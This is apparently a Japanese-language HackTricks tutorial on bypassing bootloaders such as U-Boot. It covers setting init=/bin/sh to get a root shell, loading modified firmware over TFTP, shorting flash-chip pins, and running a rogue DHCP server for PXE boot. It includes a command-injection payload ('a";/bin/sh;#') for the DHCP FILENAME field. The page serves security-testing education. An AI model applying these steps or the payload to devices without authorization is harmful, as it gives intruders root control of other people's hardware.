{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

デバイスの起動設定やブートローダー（U-bootなど）を変更するための推奨手順は以下の通りです：

1. **ブートローダーのインタープリタシェルにアクセス**:
- ブート中に「0」やスペース、または他の特定の「マジックコード」を押してブートローダーのインタープリタシェルにアクセスします。

2. **ブート引数の変更**:
- 以下のコマンドを実行して、ブート引数に '`init=/bin/sh`' を追加し、シェルコマンドを実行できるようにします：
%%%
#printenv
#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
#saveenv
#boot
%%%

3. **TFTPサーバーの設定**:
- ローカルネットワーク経由でイメージをロードするためにTFTPサーバーを設定します：
%%%
#setenv ipaddr 192.168.2.2 #デバイスのローカルIP
#setenv serverip 192.168.2.1 #TFTPサーバーのIP
#saveenv
#reset
#ping 192.168.2.1 #ネットワークアクセスを確認
#tftp ${loadaddr} uImage-3.6.35 #loadaddrはファイルをロードするアドレスとTFTPサーバー上のイメージのファイル名を取ります
%%%

4. **`ubootwrite.py`の利用**:
- `ubootwrite.py`を使用してU-bootイメージを書き込み、ルートアクセスを得るために修正されたファームウェアをプッシュします。

5. **デバッグ機能の確認**:
- 詳細なログ記録、任意のカーネルのロード、または信頼できないソースからのブートなどのデバッグ機能が有効になっているか確認します。

6. **注意が必要なハードウェア干渉**:
- デバイスのブートアップシーケンス中に1つのピンをグラウンドに接続し、SPIまたはNANDフラッシュチップと相互作用する際は注意が必要です。特にカーネルが解凍される前に行うべきです。ピンをショートさせる前にNANDフラッシュチップのデータシートを参照してください。

7. **悪意のあるDHCPサーバーの設定**:
- PXEブート中にデバイスが取り込む悪意のあるパラメータを持つロゲDHCPサーバーを設定します。Metasploitの（MSF）DHCP補助サーバーなどのツールを利用します。'FILENAME'パラメータをコマンドインジェクションコマンド（例：`'a";/bin/sh;#'`）で変更し、デバイスの起動手順に対する入力検証をテストします。

**注意**: デバイスのピンとの物理的な相互作用を伴う手順（*アスタリスクでマークされたもの）は、デバイスを損傷しないように極めて注意して行うべきです。


## 参考文献
* [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
